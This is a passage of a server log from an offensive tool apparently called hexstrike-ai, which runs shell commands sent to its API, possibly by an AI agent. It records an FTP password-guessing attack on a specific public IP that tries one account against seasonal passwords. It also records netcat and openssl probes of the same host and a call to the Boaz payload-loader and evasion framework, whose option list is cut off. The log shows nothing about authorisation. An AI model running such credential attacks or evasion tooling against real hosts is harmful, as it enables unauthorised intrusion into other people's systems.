  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/json/provider.py", line 187, in loads
    return json.loads(s, **kwargs)
           ~~~~~~~~~~^^^^^^^^^^^^^
  File "/usr/lib/python3.13/json/__init__.py", line 346, in loads
    return _default_decoder.decode(s)
           ~~~~~~~~~~~~~~~~~~~~~~~^^^
  File "/usr/lib/python3.13/json/decoder.py", line 345, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
               ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/json/decoder.py", line 361, in raw_decode
    obj, end = self.scan_once(s, idx)
               ~~~~~~~~~~~~~~^^^^^^^^
json.decoder.JSONDecodeError: Invalid \escape: line 1 column 72 (char 71)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/wrappers.py", line 131, in on_json_loading_failed
    return super().on_json_loading_failed(e)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 645, in on_json_loading_failed
    raise BadRequest(f"Failed to decode JSON object: {e}")
werkzeug.exceptions.BadRequest: 400 Bad Request: Failed to decode JSON object: Invalid \escape: line 1 column 72 (char 71)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike_server.py", line 11762, in generic_command
    params = request.json
             ^^^^^^^^^^^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 560, in json
    return self.get_json()
           ~~~~~~~~~~~~~^^
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 620, in get_json
    rv = self.on_json_loading_failed(e)
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/flask/wrappers.py", line 136, in on_json_loading_failed
    raise BadRequest() from e
werkzeug.exceptions.BadRequest: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.

2025-10-24 01:41:24,832 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:41:24] "[35m[1mPOST /api/command HTTP/1.1[0m" 500 -
2025-10-24 01:41:25,575 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2017 (Incorrect: )
2025-10-24 01:41:29,578 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2016 (Incorrect: )
2025-10-24 01:41:30,135 - __main__ - INFO - 🔍 Cache MISS for command: nc -nv 138.197.27.76 21
2025-10-24 01:41:30,135 - __main__ - INFO - 🚀 EXECUTING: nc -nv 138.197.27.76 21
2025-10-24 01:41:30,135 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:41:30,136 - __main__ - INFO - 🆔 PROCESS: PID 44673 started
2025-10-24 01:41:30,136 - __main__ - INFO - 🆔 REGISTERED: Process 44673 - nc -nv 138.197.27.76 21...
2025-10-24 01:41:30,137 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44673
2025-10-24 01:41:30,268 - __main__ - WARNING - 📥 STDERR: (UNKNOWN) [138.197.27.76] 21 (ftp) open
2025-10-24 01:41:30,398 - __main__ - INFO - 📤 STDOUT: 220 (vsFTPd 3.0.5)
2025-10-24 01:41:30,938 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 74 B/s | 0.8s | PID: 44673
2025-10-24 01:41:31,738 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 37 B/s | 1.6s | PID: 44673
2025-10-24 01:41:32,539 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 25 B/s | 2.4s | PID: 44673
2025-10-24 01:41:33,340 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 18 B/s | 3.2s | PID: 44673
2025-10-24 01:41:33,459 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2015 (Incorrect: )
2025-10-24 01:41:34,141 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 15 B/s | 4.0s | PID: 44673
2025-10-24 01:41:34,942 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 12 B/s | 4.8s | PID: 44673
2025-10-24 01:41:35,743 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 11 B/s | 5.6s | PID: 44673
2025-10-24 01:41:36,545 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 9 B/s | 6.4s | PID: 44673
2025-10-24 01:41:37,251 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2014 (Incorrect: )
2025-10-24 01:41:37,345 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 8 B/s | 7.2s | PID: 44673
2025-10-24 01:41:38,145 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 7 B/s | 8.0s | PID: 44673
2025-10-24 01:41:38,946 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 7 B/s | 8.8s | PID: 44673
2025-10-24 01:41:39,746 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.2%[0m Speed: 6 B/s | 9.6s | PID: 44673
2025-10-24 01:41:40,547 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.5%[0m Speed: 6 B/s | 10.4s | PID: 44673
2025-10-24 01:41:41,237 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2013 (Incorrect: )
2025-10-24 01:41:41,348 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.7%[0m Speed: 5 B/s | 11.2s | PID: 44673
2025-10-24 01:41:42,151 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.0%[0m Speed: 5 B/s | 12.0s | PID: 44673
2025-10-24 01:41:42,952 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.3%[0m Speed: 5 B/s | 12.8s | PID: 44673
2025-10-24 01:41:43,753 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.5%[0m Speed: 4 B/s | 13.6s | PID: 44673
2025-10-24 01:41:44,554 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.8%[0m Speed: 4 B/s | 14.4s | PID: 44673
2025-10-24 01:41:44,771 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2017 (Incorrect: )
2025-10-24 01:41:45,355 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.1%[0m ETA: 284.8s Speed: 4 B/s | 15.2s | PID: 44673
2025-10-24 01:41:46,155 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.3%[0m ETA: 284.0s Speed: 4 B/s | 16.0s | PID: 44673
2025-10-24 01:41:46,956 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.6%[0m ETA: 283.2s Speed: 4 B/s | 16.8s | PID: 44673
2025-10-24 01:41:47,758 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.9%[0m ETA: 282.4s Speed: 3 B/s | 17.6s | PID: 44673
2025-10-24 01:41:48,389 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2016 (Incorrect: )
2025-10-24 01:41:48,559 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.1%[0m ETA: 281.6s Speed: 3 B/s | 18.4s | PID: 44673
2025-10-24 01:41:49,361 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.4%[0m ETA: 280.8s Speed: 3 B/s | 19.2s | PID: 44673
2025-10-24 01:41:50,162 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.7%[0m ETA: 280.0s Speed: 3 B/s | 20.0s | PID: 44673
2025-10-24 01:41:50,964 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.9%[0m ETA: 279.2s Speed: 3 B/s | 20.8s | PID: 44673
2025-10-24 01:41:51,766 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.2%[0m ETA: 278.4s Speed: 3 B/s | 21.6s | PID: 44673
2025-10-24 01:41:52,546 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2015 (Incorrect: )
2025-10-24 01:41:52,567 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.5%[0m ETA: 277.6s Speed: 3 B/s | 22.4s | PID: 44673
2025-10-24 01:41:53,368 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.7%[0m ETA: 276.8s Speed: 3 B/s | 23.2s | PID: 44673
2025-10-24 01:41:54,168 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.0%[0m ETA: 276.0s Speed: 2 B/s | 24.0s | PID: 44673
2025-10-24 01:41:54,969 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.3%[0m ETA: 275.2s Speed: 2 B/s | 24.8s | PID: 44673
2025-10-24 01:41:55,770 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.5%[0m ETA: 274.4s Speed: 2 B/s | 25.6s | PID: 44673
2025-10-24 01:41:56,262 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2014 (Incorrect: )
2025-10-24 01:41:56,571 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.8%[0m ETA: 273.6s Speed: 2 B/s | 26.4s | PID: 44673
2025-10-24 01:41:57,261 - __main__ - INFO - 🔍 Cache MISS for command: openssl s_client -connect 138.197.27.76:21 -starttls ftp -verify_return_error
2025-10-24 01:41:57,261 - __main__ - INFO - 🚀 EXECUTING: openssl s_client -connect 138.197.27.76:21 -starttls ftp -verify_return_error
2025-10-24 01:41:57,261 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:41:57,262 - __main__ - INFO - 🆔 PROCESS: PID 44713 started
2025-10-24 01:41:57,262 - __main__ - INFO - 🆔 REGISTERED: Process 44713 - openssl s_client -connect 138.197.27.76:21 -startt...
2025-10-24 01:41:57,263 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44713
2025-10-24 01:41:57,372 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.1%[0m ETA: 272.8s Speed: 2 B/s | 27.2s | PID: 44673
2025-10-24 01:41:57,424 - __main__ - WARNING - 📥 STDERR: Connecting to 138.197.27.76
2025-10-24 01:41:57,818 - __main__ - WARNING - 📥 STDERR: 40E726AA4F7F0000:error:0A00010B:SSL routines:tls_validate_record_header:wrong version number:../ssl/record/methods/tlsany_meth.c:84:
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: CONNECTED(00000003)
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: ---
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: no peer certificate available
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: ---
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: No client certificate CA names sent
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Negotiated TLS1.3 group: <NULL>
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: ---
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: SSL handshake has read 63 bytes and written 1670 bytes
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Verification: OK
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: ---
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: New, (NONE), Cipher is (NONE)
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Protocol: TLSv1.3
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: This TLS version forbids renegotiation.
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Compression: NONE
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Expansion: NONE
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: No ALPN negotiated
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Early data was not sent
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: Verify return code: 0 (ok)
2025-10-24 01:41:57,820 - __main__ - INFO - 📤 STDOUT: ---
2025-10-24 01:41:58,000 - __main__ - INFO - 🧹 CLEANUP: Process 44713 removed from registry
2025-10-24 01:41:58,000 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.74s
2025-10-24 01:41:58,000 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:41:58,000 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m openssl s_client -connect 138.197.27.76:21 -starttls ft...
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.74s
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 563 bytes
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:41:58,000 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:41:58,000 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:41:58,001 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:41:58] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:41:58,172 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.3%[0m ETA: 272.0s Speed: 2 B/s | 28.0s | PID: 44673
2025-10-24 01:41:58,973 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.6%[0m ETA: 271.2s Speed: 2 B/s | 28.8s | PID: 44673
2025-10-24 01:41:59,774 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.9%[0m ETA: 270.4s Speed: 2 B/s | 29.6s | PID: 44673
2025-10-24 01:41:59,893 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2013 (Incorrect: )
2025-10-24 01:42:00,575 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.1%[0m ETA: 269.6s Speed: 2 B/s | 30.4s | PID: 44673
2025-10-24 01:42:01,377 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.4%[0m ETA: 268.8s Speed: 2 B/s | 31.2s | PID: 44673
2025-10-24 01:42:02,178 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.7%[0m ETA: 268.0s Speed: 2 B/s | 32.0s | PID: 44673
2025-10-24 01:42:02,979 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.9%[0m ETA: 267.2s Speed: 2 B/s | 32.8s | PID: 44673
2025-10-24 01:42:03,706 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2017 (Incorrect: )
2025-10-24 01:42:03,779 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.2%[0m ETA: 266.4s Speed: 2 B/s | 33.6s | PID: 44673
2025-10-24 01:42:04,581 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.5%[0m ETA: 265.6s Speed: 2 B/s | 34.4s | PID: 44673
2025-10-24 01:42:05,381 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.7%[0m ETA: 264.8s Speed: 2 B/s | 35.2s | PID: 44673
2025-10-24 01:42:06,181 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.0%[0m ETA: 264.0s Speed: 2 B/s | 36.0s | PID: 44673
2025-10-24 01:42:06,982 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.3%[0m ETA: 263.2s Speed: 2 B/s | 36.8s | PID: 44673
2025-10-24 01:42:07,291 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2016 (Incorrect: )
2025-10-24 01:42:07,783 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.5%[0m ETA: 262.4s Speed: 2 B/s | 37.6s | PID: 44673
2025-10-24 01:42:08,586 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.8%[0m ETA: 261.6s Speed: 2 B/s | 38.4s | PID: 44673
2025-10-24 01:42:09,387 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.1%[0m ETA: 260.8s Speed: 2 B/s | 39.2s | PID: 44673
2025-10-24 01:42:10,187 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.4%[0m ETA: 259.9s Speed: 1 B/s | 40.1s | PID: 44673
2025-10-24 01:42:10,987 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.6%[0m ETA: 259.1s Speed: 1 B/s | 40.9s | PID: 44673
2025-10-24 01:42:11,064 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2015 (Incorrect: )
2025-10-24 01:42:11,788 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.9%[0m ETA: 258.3s Speed: 1 B/s | 41.7s | PID: 44673
2025-10-24 01:42:12,589 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.2%[0m ETA: 257.5s Speed: 1 B/s | 42.5s | PID: 44673
2025-10-24 01:42:13,390 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.4%[0m ETA: 256.7s Speed: 1 B/s | 43.3s | PID: 44673
2025-10-24 01:42:14,193 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.7%[0m ETA: 255.9s Speed: 1 B/s | 44.1s | PID: 44673
2025-10-24 01:42:14,994 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.0%[0m ETA: 255.1s Speed: 1 B/s | 44.9s | PID: 44673
2025-10-24 01:42:15,054 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2014 (Incorrect: )
2025-10-24 01:42:15,795 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.2%[0m ETA: 254.3s Speed: 1 B/s | 45.7s | PID: 44673
2025-10-24 01:42:16,596 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.5%[0m ETA: 253.5s Speed: 1 B/s | 46.5s | PID: 44673
2025-10-24 01:42:17,397 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.8%[0m ETA: 252.7s Speed: 1 B/s | 47.3s | PID: 44673
2025-10-24 01:42:18,198 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.0%[0m ETA: 251.9s Speed: 1 B/s | 48.1s | PID: 44673
2025-10-24 01:42:18,598 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2013 (Incorrect: )
2025-10-24 01:42:18,998 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.3%[0m ETA: 251.1s Speed: 1 B/s | 48.9s | PID: 44673
2025-10-24 01:42:19,799 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.6%[0m ETA: 250.3s Speed: 1 B/s | 49.7s | PID: 44673
2025-10-24 01:42:20,600 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.8%[0m ETA: 249.5s Speed: 1 B/s | 50.5s | PID: 44673
2025-10-24 01:42:21,401 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.1%[0m ETA: 248.7s Speed: 1 B/s | 51.3s | PID: 44673
2025-10-24 01:42:22,202 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.4%[0m ETA: 247.9s Speed: 1 B/s | 52.1s | PID: 44673
2025-10-24 01:42:22,599 - __main__ - INFO - 🔍 Cache MISS for command: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py --list-loaders
2025-10-24 01:42:22,599 - __main__ - INFO - 🚀 EXECUTING: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py --list-loaders
2025-10-24 01:42:22,599 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:42:22,600 - __main__ - INFO - 🆔 PROCESS: PID 44758 started
2025-10-24 01:42:22,600 - __main__ - INFO - 🆔 REGISTERED: Process 44758 - cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py ...
2025-10-24 01:42:22,601 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44758
2025-10-24 01:42:22,882 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2017 (Incorrect: )
2025-10-24 01:42:23,003 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.6%[0m ETA: 247.1s Speed: 1 B/s | 52.9s | PID: 44673
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: usage: Boaz.py [-h] [-f INPUT_FILE] [-o OUTPUT_FILE] [-divide] [-l LOADER]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-dll] [-cpl] [-sleep] [-a] [-cfg] [-etw] [-j] [-dream [DREAM]]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-u] [-g] [-t {donut,pe2sh,rc4,amber,shoggoth,augment}] [-sd]
